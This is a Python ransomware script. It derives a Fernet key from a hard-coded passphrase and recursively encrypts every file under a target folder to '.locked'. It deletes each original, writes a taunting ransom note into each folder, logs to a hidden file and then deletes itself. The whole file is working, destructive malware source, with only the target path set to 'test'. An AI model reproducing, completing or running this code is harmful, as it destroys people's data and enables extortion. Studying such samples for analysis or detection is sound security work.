import pathlib
import secrets
import os
import base64
import shutil
import logging
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
danger = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠤⠖⠒⠒⢰⣿⣿⣧⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡼⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢴⡿⠛⣩⠟⠋⠀⠀⠀⠀⠀⣤⢿⣿⣿⢸⠀⠀⠀⠈⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⢋⡼⠁⣠⠞⠁⠀⠀⠀⠀⠀⣠⠛⣽⣿⣿⣿⡏⠀⠀⠀⠀⠀⠹⣿⣍⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠖⢛⣳⣶⣟⣿⠟⠁⠀⠋⣠⣾⠋⠀⠀⠀⠀⠀⠀⡾⠁⣰⣿⣟⣽⣿⡇⠀⠀⠀⠀⠀⠀⢿⣿⡄⠈⣿⠲⣄⠀⠀⠀⠀⠀⠀⠀⣤⣴⣿⣿⠁⠀⠀
⠀⠀⠀⣀⠀⢀⣠⣴⠋⢀⡜⠋⣻⣿⣿⢯⠀⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⢀⡞⠁⢠⡿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠄⠘⣧⣈⢳⠄⠀⠀⣠⣠⣶⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠉⢉⣿⠁⢀⣿⣿⢛⡷⣻⠃⠀⠀⠀⢰⢳⠋⠀⠀⠀⠀⠀⢀⡞⠁⢠⠟⠀⠀⠊⠘⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠐⠀⡜⠀⢀⣠⢞⣿⣿⣿⡿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⠋⠀⢸⣿⣗⡞⢹⠇⠀⠀⠀⠀⡿⡿⠀⠀⠀⠀⠀⠀⡞⠁⢀⠟⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⡷⠜⠉⠀⠀⠰⣿⠛⣴⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⠻⠛⠀⢀⣾⣿⣿⣇⡎⠀⠀⠀⠀⡶⣷⠁⠀⠀⠀⠀⠀⢸⠃⠀⡾⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠀⠀⢰⡇⠀⠀⠀⠀⠀⣨⠞⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⠏⠀⠀⠀⣼⠘⢻⣿⣿⠇⢠⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⡞⣀⡸⠁⠀⠀⠀⣴⣋⣸⣠⣶⠾⠁⠀⠀⢀⣿⡏⡀⠀⠀⣼⠀⠀⠀⣀⣠⡞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢠⢹⣾⣿⢸⣿⠀⢸⡀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⣿⡟⡗⠒⠒⠋⠉⠉⠉⢁⢀⡄⠀⠀⢀⡰⠋⢱⠃⠙⣦⣰⠇⠰⠶⠚⠉⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠃⠀⠀⠀⣿⠀⢿⣽⠈⢹⠀⠈⣇⠀⠀⠇⣿⡀⡄⠀⠀⠀⠀⣯⣷⣷⣶⣶⣶⣶⣶⣦⣼⡿⠇⠀⣰⡎⠁⠀⠉⠀⢠⣿⠟⠷⣄⣀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠀⣽⠀⢸⡄⠀⠸⡆⠀⠀⢹⢧⣳⢦⣄⣐⣾⣿⡿⠿⠋⠉⠀⢀⣼⣯⣝⠻⠷⠞⡝⠀⠀⢀⠀⢠⠟⣥⣀⡀⠈⡟⣦⠄⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠇⠀⠀⣿⡆⠈⡷⡆⠀⠻⡄⠀⠈⣆⠹⡀⠈⠉⣻⡏⠀⠀⠀⠀⢀⠉⢿⣿⢿⡆⠀⣸⣫⠴⢖⣿⣰⠿⠲⣟⣛⢿⣿⣷⡇⠀⢠⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡄⠀⠀⢸⠀⠀⠀⢯⢧⡀⣸⣷⡄⠀⠀⠀⡀⠹⣄⢧⠀⠈⡿⢿⣄⡀⣀⣀⣿⠤⠾⠿⠼⢧⡀⠀⠀⠠⠾⠋⠁⠀⠸⣿⣿⣞⠋⢻⣧⢤⣸⣇⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠀⠀⣀⡼⣾⣫⣭⣉⣙⢦⡀⠀⠳⣀⠙⢾⣦⡀⡇⠀⠉⠽⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⢻⡿⣿⣿⠀⣸⡟⢛⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢳⠀⠀⢸⡀⢾⣩⡈⠉⠀⡀⢀⠨⠷⠭⣳⣶⠿⠶⠚⢿⡛⢺⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⠉⠀⠈⠉⠻⢿⣿⡾⢏⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⣄⠀⠈⣇⠀⠙⢮⡢⠀⠘⣟⢆⠀⠀⠘⢿⠀⠀⣦⢬⣳⣄⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠾⢾⡕⢾⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢻⠀⠀⣿⠀⠀⠀⣽⠦⣄⠘⢎⣳⣀⠀⠈⣇⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⣿⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⡆⠀⢸⣷⡀⠀⡏⠀⡏⠱⣄⠈⠉⠉⠳⣿⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣍⣽⣿⣯⣭⣲⡿⢿⣄⠀⠀⠀⠀⠀⠀⠀⡼⢱⠇⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⠁⠀⠈⡇⠘⢦⡇⢀⡇⠀⢈⡷⣄⣸⣟⢾⡘⣿⣣⡀⠀⠀⠀⠀⠀⠀⠀⢸⠛⠻⢿⣿⣿⣿⣿⣿⡆⠀⢷⡽⠓⠀⠀⠀⠀⣰⠃⢸⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡼⢹⠀⠀⠀⣿⠀⢠⠻⡾⠃⠀⢸⣿⠀⠀⠈⣿⣏⣧⠈⠛⠂⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠘⠈⠻⣿⡟⢧⡀⠀⠻⣄⠀⠀⢀⡴⡇⠀⢸⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠞⡕⣾⠀⠀⠀⣿⠀⡟⢇⢸⠀⠀⠈⢯⣳⠤⠴⣿⣸⠈⢳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣄⡀⠀⢹⠇⣨⢧⡀⠀⠈⠳⣴⣯⣷⠟⠛⠻⡇⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀
⢈⢼⠁⣿⠀⠀⠀⣿⢸⠇⢸⣿⡆⠀⠀⠀⠉⠉⢩⠃⡏⠀⠘⡇⠙⠢⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠋⠁⠀⠙⣤⠀⡾⠁⣸⠃⠀⠀⢠⠹⣄⠀⠈⠷⡀⠀⠀⠀⠀⠀⠀
⢀⡆⢀⡇⠀⠀⢠⣯⢻⠀⢸⢿⠃⠀⠀⠀⠀⠀⡟⠀⡇⠀⠀⣿⣆⡀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠀⣰⠃⠀⠀⢰⠇⠀⠈⠉⠁⠀⠙⣄⠀⠀⠀⠀⠀
⢸⠁⣼⠀⠀⠀⡾⣼⢸⠀⣼⡇⠀⠀⣀⡀⠀⢰⠁⠀⣷⠀⣰⣿⣿⣿⣦⣀⣠⣾⡟⣤⣿⣿⡒⢶⣤⣤⣤⣤⡤⣾⠁⠀⡇⢀⣼⣤⣤⡤⠼⢿⡟⠉⠁⠀⠀⠀⠙⣄⠀⠀⠀⠀
⠁⠀⡟⢠⠀⣾⠁⡇⠈⠀⣡⠗⠛⠉⠈⠉⠙⠚⡆⠀⠈⠻⣼⣷⡙⠻⣿⣿⣿⣿⡇⣿⣿⣿⣷⢾⣿⡗⣧⣸⠀⣿⡀⠀⢹⡏⠀⠀⠀⢡⣴⡏⠹⡦⠤⢄⡀⠀⠀⠘⣄⠀⠀⠀
⠀⢰⡇⣿⢸⠃⠀⣇⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠘⠿⢷⣤⠄⠉⠛⠉⠙⢿⣿⣿⡟⠻⣿⡿⠃⠉⠓⢿⣿⣿⡋⠀⠤⢤⣤⡔⠚⠳⣾⢳⡄⠀⠀⠀⠀⠀⠘⢇⠀⠀
⠀⣼⠇⣿⠸⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣤⣤⠤⢾⡇⠀⠀⠀⠀⠙⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⣀⡽⠿⢿⠀⠀⠀⠎⠀⠀⠀⠈⢣⣳⡀⠀⠀⠀⠀⠀⠈⣇⠀
⢰⣧⠀⣿⣆⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠉⠀⠀⠀⡈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠁⠳⣄⡀⠀⠀⠀⠀⠘⡆
⠈⠛⣇⢹⣽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠚⠓⠦⢄⣀⠀⠀⠀⠀⠀⠀⠉⠀⠀⣤⣀⣀⣸
⠀⠀⠈⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣶⣦⣀⣉⠁⠒⠶⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠲⢤⣄⣀⣀⣠⣤⣴⣿⣿⣿⣿
⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉

What’s going down?
- Your entire digital world has been seized with military-grade encryption. This isn’t your run-of-the-mill lock. It’s impregnable, and cracking it yourself? 
  Forget it. Your data is effectively a black hole now.

Why is this happening?
- I’ve been watching, and your security is a disaster. Too many holes, too many backdoors. You’re too quick to trust, too eager to click. You’re practically begging for this chaos.
- This isn’t just about a random attack. It’s a wake-up call. Your negligence and overconfidence have exposed your weaknesses. I’m here to rub it in and make you rethink your entire approach to security.

What’s the play?
- You’ll find a file called sacradecryptor.py. It’s the key to unlocking your files, but don’t get too comfortable.
- There’s a catch. I’ve left a decryption clue in a hidden message. You need to crack this 'INHEMY2FGBGFI5DVIBMDCUTEIMYTWIY=' code to restore your files.
- Sharpen your mind and use your problem-solving skills. No timer here—consider it a gift.

What’s my endgame?
- I’m here to disrupt and demonstrate how fragile your cybersecurity truly is. I aim to force companies and governments to rethink their defenses.
- Your money? Not interested. What I want is for you to get serious about security and innovation before the next breach hits even harder.
                                                 
"""
logging.basicConfig(filename='.encryption.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
def generate_salt(size=16):
    return secrets.token_bytes(size)
def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
def load_salt():
    return open("salt.salt", "rb").read()
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open(".Wr4ith.salt", "wb") as salt_file:
            salt_file.write(salt)
    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)
def create_ransom_note(path, message):
    note_path = os.path.join(path, "PLEASE_READ_ME.txt")
    with open(note_path, "w") as note_file:
        note_file.write(message)
    logging.info(f"Ransom note created at {note_path}")
def delete_file(filepath):
    if os.path.isfile(filepath):
        os.remove(filepath)
        logging.info(f"Deleted file {filepath}")
def encrypt(filename, key):
    try:
        filename_str = str(filename)
        f = Fernet(key)
        with open(filename_str, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        locked_filename = filename_str + ".locked"
        with open(locked_filename, "wb") as file:
            file.write(encrypted_data)
        delete_file(filename_str)
        create_ransom_note(os.path.dirname(filename_str), danger)
    except PermissionError as e:
        logging.error(f"Permission error while processing {filename}: {e}")
    except Exception as e:
        logging.error(f"Error while processing {filename}: {e}")
def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            logging.info(f"Encrypting file {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)
if __name__ == "__main__":
    path = "test"  
    passphrase = "fuckCruelW0orld"  
    keysize = 16 
    key = generate_key(passphrase, salt_size=keysize, save_salt=True)
    if os.path.isfile(path):
        encrypt(path, key)
    elif os.path.isdir(path):
        encrypt_folder(path, key)
    else:
        raise TypeError("Invalid path specified.")
    script_path = os.path.abspath(__file__)
    if os.path.isfile(script_path):
        os.remove(script_path)
        logging.info(f"Self-destructed script at {script_path}")


